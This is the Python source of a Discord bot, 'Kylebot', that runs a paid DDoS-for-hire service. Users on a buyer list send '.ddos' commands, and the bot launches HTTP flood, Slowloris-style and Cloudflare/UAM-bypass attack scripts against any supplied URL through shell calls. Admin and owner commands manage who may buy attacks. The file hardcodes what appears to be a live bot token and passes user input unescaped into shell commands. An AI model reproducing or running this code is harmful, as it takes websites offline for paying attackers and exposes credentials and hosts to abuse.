__author__ = 'Kyle Tran'
__version__ = '1.2'
__github__ = 'github.com/kyletran191'
__license__ = 'GNU General Public License v3.0'
# Kylebot | Discord ddos bot v1.2 | Kyle Tran
#=====Import Module=====#
import os
try:
	import discord
except ImportError:
	os.system("pip install discord")
try:
	import colorama
except ImportError:
	os.system("pip install colorama")
from discord.ext import commands    
from discord.ext.commands import Bot 
from os import system        
from os import name                  
from colorama import *                                                
import random, datetime, discord                        
#=====User && Methods Setting=====#
buyers  = [1182101098207649832]  #          
admins  = [1182101098207649832]  #   ID users            
owners  = [1182101098207649832]  #          
methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UAM-BYPASS','SLOW'] # Methods
year_now= datetime.datetime.now().strftime("%Y")     
token   = 'MTE4MjEwMTA5ODIwNzY0OTgzMg.GjY1-T.pVMTUXtr5adJQq_sfw-SW5KBdDuGMDI3RTPTtU' # paste your token here
intents = discord.Intents.default()
intents.members = True 
intents.message_content = True
intents.messages = True
intents.dm_messages = True       
bot     = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help")    
#=====Random Color=====#
async def random_color():
    number_lol = random.randint(1, 999999)
    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))
    return number_lol
#=====Bot Command=====#
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="Kyle Network | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**All Methods**", value = f"```yaml\nHTTP-FLOOD\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKET\nCLOUDFLARE\nUAM-BYPASS\nSLOW```")
        embed.add_field(name = "**Syntax**", value = "```md\n.ddos <method> <url> <thread> <time>```")
        embed.add_field(name = "**NOTE**", value = "> __**Don't spam**__ the attacks or your plan\n > __will be **removed**__.\n\n> Regards, \n> Kyle Network.")
        embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
        await ctx.send(embed=embed)
@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer in buyers:
        await ctx.send(f'{buyer} has already copped a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.append(buyer)
        await ctx.send('Added him/her!!')

@bot.command()
async def delete_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer not in buyers:
        await ctx.send(f'{buyer} did not cop a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.remove(buyer)
        await ctx.send('Removed him/her!!')
        
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin in admins:
        await ctx.send(f'{admin} is already an admin!')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.append(admin)
        await ctx.send('Added him/her!!')

@bot.command()
async def delete_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin not in admins:
        await ctx.send(f'{admin} is not an admin')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.remove(admin)
        await ctx.send('Removed him/her!!')

@bot.command()
async def ddos(ctx, method : str = None, victim : str = None, thread : str = None, time : str = None):
    if ctx.author.id not in buyers: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if method is None:
            embed = discord.Embed(title=f"Error!", description=f"You need a method! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif method.upper() not in methods:
            embed = discord.Embed(title="Error!", description=f"Invalid method!! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif thread is None:
            embed = discord.Embed(title="Error!", description=f"You need a thread! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(300)
                max_thread = int(50000)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                if int(thread) > max_thread:
                    thread2 = max_thread
                else:
                    thread2 = int(thread)
                if method == 'HTTP-FLOOD':
                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
                    await ctx.send(embed=embed)
                    system(f'go run httpflood.go {victim} {thread2} get {time2} nil')
                elif method == 'HTTP-RAW':
                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
                    await ctx.send(embed=embed)
                    system(f'node HTTP-RAW.js {victim} {time2}')
                elif method == 'HTTP-RAND':
                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
                    await ctx.send(embed=embed)
                    system(f'node HTTP-RAND.js {victim} {time2}')
                elif method == 'HTTP-SOCKET':
                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
                    await ctx.send(embed=embed)
                    system(f'node HTTP-SOCKET.js {victim} 7000 {time2}')
                elif method == 'CLOUDFLARE':
                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
                    await ctx.send(embed=embed)
                    system(f'node cf.js {victim} {time2} {thread2}')
                elif method == 'UAM-BYPASS':
                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
                    await ctx.send(embed=embed)
                    system(f'node uambypass.js {victim} {time2} 2000 http.txt')
                elif method == 'SLOW':
                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
                    await ctx.send(embed=embed)
                    system(f'node slow.js {victim} {time2}')

           

@bot.event
async def on_ready():
    banner = f"""
\033[1;96mdb   dD db    db db      d88888b   d8888b.  .d88b.  d888888b 
\033[1;97m88 ,8P' `8b  d8' 88      88'       88  `8D .8P  Y8. `~~88~~' 
\033[1;92m88,8P    `8bd8'  88      88ooooo   88oooY' 88    88    88    
\033[1;93m88`8b      88    88      88~~~~~   88~~~b. 88    88    88    
\033[1;96m88 `88.    88    88booo. 88.       88   8D `8b  d8'    88    
\033[1;97mYP   YD    YP    Y88888P Y88888P   Y8888P'  `Y88P'     YP 
\033[1;92m                                      @kyletran191
\033[1;97m=============================================================
    """
    if name == 'nt':
        system('cls')
    else:
        system('clear')
    print(banner)
    print(f'\033[1;97mLogged \033[1;96m{bot.user.name}')
    print(f'\033[1;97mBot ID: \033[1;97m{bot.user.id}')
    print('\033[1;97m=============================================================')
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))
if __name__ == '__main__':
    init(convert=True)
    bot.run(token)
